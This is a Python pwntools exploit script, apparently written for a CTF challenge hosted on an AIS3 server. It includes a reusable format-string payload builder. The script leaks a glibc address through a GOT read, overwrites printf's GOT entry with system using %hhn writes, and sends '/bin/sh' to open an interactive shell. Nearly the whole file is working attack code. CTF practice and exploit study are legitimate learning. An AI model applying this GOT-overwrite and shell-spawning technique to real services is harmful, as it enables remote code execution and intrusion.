# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#

# not yet completed

from pwn import *

class format_s:
    value_now = 0
    payload_string = b""

    def start(self):
        self.value_now = 0
        self.payload_string = b""
        return self

    def hhn(self, write_value, parameter_index):
        b = 0x100
        d = ((write_value - self.value_now) % b + b) % b
        if d == 0:
            self.payload_string += b"%%%d$hhn" % parameter_index
        else:
            self.payload_string += b"%%%dc%%%d$hhn" % (d, parameter_index)
        self.value_now += d
        return self

    def hn(self, write_value, parameter_index):
        b = 0x10000
        d = ((write_value - self.value_now) % b + b) % b
        if d == 0:
            self.payload_string += b"%%%d$hn" % parameter_index
        else:
            self.payload_string += b"%%%dc%%%d$hn" % (d, parameter_index)
        self.value_now += d
        return self

    def ljust(self, size, byte='\x00'):
        assert len(self.payload_string) <= size     # ljust is too short
        self.value_now += size - len(self.payload_string)
        self.payload_string = self.payload_string.ljust(size, byte)
        return self

    def append(self, append_s):
        self.value_now += len(append_s)
        self.payload_string += append_s
        return self

    def get(self):
        return self.payload_string

fmt = format_s()
# usage
# target_address = 0x60106c
# payload = fmt.start().hhn(0xda, 8).ljust(16, b"A").append(p64(target_address)).get()
# payload = fmt.start().hhn(0xfa, 12).hhn(0xce, 13).hhn(0xb0, 14).hhn(0x0c, 15).ljust((12 - 6) * 8, b"A").append(p64(target_address)).append(p64(target_address + 0x1)).append(p64(target_address + 0x2)).append(p64(target_address + 0x3)).get()

context.arch = "i386"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = False

host = "srv01.ctf.ais3.org"
port = 5521
glibc_system_offset = 0x4f440
glibc_printf_offset = 0x64e80
glibc_isoc99_scanf_offset = 0x7bec0
recv_timeout = 0
if is_local:
    host = "127.0.0.1"
    port = 8888
    glibc_system_offset = 0x45390
    glibc_printf_offset = 0x55800
    glibc_isoc99_scanf_offset = 0x6b4d0
    recv_timeout = 0

r = remote(host, port)

#input("Attach in gdb and press Enter")

string_buffer = 0x40074a
write_string = u64(b"/bin/sh\x00")
put_got_address = 0x601018
printf_got_address = 0x601028
scanf_got_address = 0x601038
main_26 = 0x400646 #checked
format_string_paramenter_begin = 6

# first payload
address_save_P_offset = 10
P_offset = format_string_paramenter_begin + address_save_P_offset
fmt.start()
for i in range(8):
    fmt.hhn(main_26 >> (i * 8) & 0xff, P_offset)
    P_offset += 1
fmt.ljust(address_save_P_offset * 8, b"A")
for i in range(8):
    fmt.append(p64(put_got_address + i))

payload = fmt.get()
log.info("payload: " + str(payload))
log.info("payload len: " + str(len(payload)))
r.sendline(payload)

fmt.start()
fmt.append(b"%%%d$s" % 7).ljust(8, b"A").append(p64(scanf_got_address))
r.sendline(fmt.get())

leak_massage = b""
for i in range(0xfff):
    log.info("test round: " + str(i))
    r.sendline(b"F")
    leak_message = r.recv(timeout = recv_timeout)
    if leak_message:
        break

glibc_scanf_address_bytes = leak_message[0x209:0x20f].ljust(8, b"\x00")
log.info(glibc_scanf_address_bytes)
glibc_scanf_address = u64(glibc_scanf_address_bytes)
glibc_base = glibc_scanf_address - glibc_isoc99_scanf_offset
glibc_system_address = glibc_base + glibc_system_offset
log.info("glibc system address: " + str(hex(glibc_system_address)))

#input("Attach in gdb and press Enter")

# write system to printf got
address_save_P_offset = 12
P_offset = format_string_paramenter_begin + address_save_P_offset
fmt.start()
for i in range(8):
    fmt.hhn(glibc_system_address >> (i * 8) & 0xff, P_offset)
    P_offset += 1
fmt.ljust(address_save_P_offset * 8, b"A")
for i in range(8):
    fmt.append(p64(printf_got_address + i))
payload = fmt.get()
log.info("payload: " + str(payload))
log.info("payload len: " + str(len(payload)))
r.sendline(payload)

r.sendline(b"/bin/sh\x00")
#r.sendline("cat /home/fmt/flag")

r.interactive("Pwned # ")

